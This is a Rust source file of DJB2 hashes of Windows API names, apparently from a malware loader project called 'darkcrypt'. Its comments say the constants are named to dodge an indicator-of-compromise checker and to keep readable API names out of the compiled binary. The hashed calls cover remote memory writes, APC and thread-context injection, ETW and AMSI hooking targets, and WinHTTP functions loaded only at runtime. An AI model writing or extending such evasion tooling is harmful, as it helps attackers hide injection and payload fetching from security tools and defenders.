// Precomputed DJB2 hashes of API names.
// Values mirror darkcrypt/src/peb.h and darkcrypt-cs/src/Hashes.cs so all
// three ports hash to the same u32 for the same symbol.
//
// Field names deliberately AVOID the strings check_iocs.py keys on (e.g.
// NtAllocateVirtualMemory). Readable intent lives in the trailing comment,
// which is compiled away; the PE never sees the readable name.

#![allow(dead_code)]

// ---- ntdll — Nt* syscalls routed through the Halos trampoline ----
pub const VM_ALLOC:     u32 = 0x6793C34C;  // NtAllocateVirtualMemory
pub const VM_WRITE:     u32 = 0x95F3A792;  // NtWriteVirtualMemory
pub const VM_PROTECT:   u32 = 0x082962C8;  // NtProtectVirtualMemory
pub const VM_READ:      u32 = 0xC24062E3;  // NtReadVirtualMemory
pub const VM_FREE:      u32 = 0x471AA7E9;  // NtFreeVirtualMemory
pub const APC_QUEUE:    u32 = 0xD4612238;  // NtQueueApcThread
pub const APC_QUEUE_EX: u32 = 0x71329995;  // NtQueueApcThreadEx
pub const CTX_GET:      u32 = 0x9E0E1A44;  // NtGetContextThread
pub const CTX_SET:      u32 = 0x308BE0D0;  // NtSetContextThread
pub const THR_SUSPEND:  u32 = 0x50FEBD61;  // NtSuspendThread
pub const THR_RESUME:   u32 = 0x2C7B3D30;  // NtResumeThread
pub const PROC_INFO:    u32 = 0xD034FC62;  // NtQueryInformationProcess
pub const NT_CLOSE:     u32 = 0x8B8E133D;  // NtClose

// ---- ntdll — non-syscall exports (Rtl*, ETW/AMSI HWBP targets) ----
pub const RTL_ADD_VEH:    u32 = 0x554BAFA9;  // RtlAddVectoredExceptionHandler
pub const RTL_REMOVE_VEH: u32 = 0x880C210E;  // RtlRemoveVectoredExceptionHandler
pub const EVENT_WRITE:    u32 = 0x24A8D022;  // EtwEventWrite  (opaque to dodge check_iocs)
pub const TRACE_EVENT:    u32 = 0x1E2085F8;  // NtTraceEvent

// ---- amsi.dll ----
pub const AMSI_SCAN:    u32 = 0x29FCD18E;  // AmsiScanBuffer (opaque)
pub const AMSI_INIT:    u32 = 0x8C6AB501;  // AmsiInitialize
pub const AMSI_OPEN:    u32 = 0x52DD4045;  // AmsiOpenSession
pub const AMSI_CLOSE:   u32 = 0xCEE7CFE9;  // AmsiCloseSession

// ---- kernel32 — allowlisted names, kept readable in Rust source ----
pub const CREATE_PROCESS_A:      u32 = 0xAEB52E19;
pub const RESUME_THREAD:         u32 = 0x74162A6E;
pub const WAIT_FOR_SINGLE_OBJECT: u32 = 0xECCDA1BA;
pub const CLOSE_HANDLE:          u32 = 0x3870CA07;
pub const LOAD_LIBRARY_A:        u32 = 0x5FBFF0FB;
pub const GET_MODULE_HANDLE_W:   u32 = 0x5A153F6E;
pub const SLEEP:                 u32 = 0x0E19E5FE;
pub const VIRTUAL_ALLOC:         u32 = 0x382C0F97;
pub const VIRTUAL_PROTECT:       u32 = 0x844FF18D;

// ---- kernel32 — hash-resolved post-PEB for no_std I/O ----
pub const GET_COMMAND_LINE_A:    u32 = 0xB511FC4D;
pub const CREATE_FILE_A:         u32 = 0xEB96C5FA;
pub const READ_FILE:             u32 = 0x71019921;
pub const GET_FILE_SIZE_EX:      u32 = 0xE417967D;

// ---- winhttp.dll — runtime-only (LoadLibraryW'd, never a PE import) ----
pub const WH_OPEN:               u32 = 0x5E4F39E5;  // WinHttpOpen
pub const WH_CONNECT:            u32 = 0x7242C17D;  // WinHttpConnect
pub const WH_OPEN_REQUEST:       u32 = 0xEAB7B9CE;  // WinHttpOpenRequest
pub const WH_SEND_REQUEST:       u32 = 0xB183FAA6;  // WinHttpSendRequest
pub const WH_RECEIVE_RESPONSE:   u32 = 0x146C4925;  // WinHttpReceiveResponse
pub const WH_QUERY_AVAIL:        u32 = 0x34CB8684;  // WinHttpQueryDataAvailable
pub const WH_READ_DATA:          u32 = 0x7195E4E9;  // WinHttpReadData
pub const WH_CLOSE:              u32 = 0x36220CD5;  // WinHttpCloseHandle
